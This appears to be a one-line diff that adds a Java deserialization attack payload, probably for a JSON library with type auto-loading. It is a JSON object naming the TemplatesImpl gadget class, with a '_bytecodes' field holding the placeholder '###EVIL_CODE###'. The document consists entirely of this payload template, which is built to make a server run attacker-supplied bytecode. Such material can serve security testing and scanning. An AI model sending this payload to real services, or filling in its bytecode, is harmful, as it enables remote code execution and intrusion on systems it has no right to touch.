@@ -1,0 +1,1 @@
+{"@type":"org.apache.xalan.xsltc.trax.TemplatesImpl","_bytecodes":["###EVIL_CODE###"],'_name':'a.b','_tfactory':{ },"_outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}
